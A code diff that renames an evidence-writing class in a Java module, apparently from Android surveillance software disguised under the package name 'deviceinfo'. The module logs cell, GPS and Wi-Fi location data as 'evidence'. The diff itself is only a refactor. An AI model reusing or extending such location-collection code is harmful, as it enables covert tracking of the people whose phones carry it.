@@ -26,7 +26,7 @@ import com.android.deviceinfo.Status;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.conf.ConfModule;
 import com.android.deviceinfo.conf.ConfigurationException;
-import com.android.deviceinfo.evidence.EvidenceReference;
+import com.android.deviceinfo.evidence.EvidenceBuilder;
 import com.android.deviceinfo.evidence.EvidenceType;
 import com.android.deviceinfo.interfaces.IncrementalLog;
 import com.android.deviceinfo.module.position.GPSLocationListener;
@@ -156,13 +156,13 @@ public class ModulePosition extends BaseInstantModule implements GPSLocationList
 
 		synchronized (position) {
 			if (info.gsm) {
-				EvidenceReference logCell = new EvidenceReference(EvidenceType.LOCATION_NEW, getAdditionalData(0,
+				EvidenceBuilder logCell = new EvidenceBuilder(EvidenceType.LOCATION_NEW, getAdditionalData(0,
 						LOG_TYPE_GSM));
 				logCell.write(getCellPayload(info, LOG_TYPE_GSM));
 				logCell.close();
 
 			} else if (info.cdma) {
-				EvidenceReference logCell = new EvidenceReference(EvidenceType.LOCATION_NEW, getAdditionalData(0,
+				EvidenceBuilder logCell = new EvidenceBuilder(EvidenceType.LOCATION_NEW, getAdditionalData(0,
 						LOG_TYPE_CDMA));
 				logCell.write(getCellPayload(info, LOG_TYPE_CDMA));
 				logCell.close();
@@ -198,7 +198,7 @@ public class ModulePosition extends BaseInstantModule implements GPSLocationList
 
 			byte[] payload = getGPSPayload(location, timestamp);
 
-			EvidenceReference logGPS = new EvidenceReference(EvidenceType.LOCATION_NEW, getAdditionalData(0,
+			EvidenceBuilder logGPS = new EvidenceBuilder(EvidenceType.LOCATION_NEW, getAdditionalData(0,
 					LOG_TYPE_GPS));
 			logGPS.write(payload);
 
@@ -217,7 +217,7 @@ public class ModulePosition extends BaseInstantModule implements GPSLocationList
 		}
 
 		synchronized (position) {
-			EvidenceReference logWifi = new EvidenceReference(EvidenceType.LOCATION_NEW, getAdditionalData(
+			EvidenceBuilder logWifi = new EvidenceBuilder(EvidenceType.LOCATION_NEW, getAdditionalData(
 					results.size(), LOG_TYPE_WIFI));
 
 			for (ScanResult wifi : results) {
@@ -281,7 +281,7 @@ public class ModulePosition extends BaseInstantModule implements GPSLocationList
 		databuffer.write(payload);
 
 		// delimiter
-		databuffer.writeInt(EvidenceReference.E_DELIMITER);
+		databuffer.writeInt(EvidenceBuilder.E_DELIMITER);
 
 		if (Cfg.DEBUG) {
 			Check.ensures(databuffer.getPosition() == size, "saveEvidence wrong size"); //$NON-NLS-1$
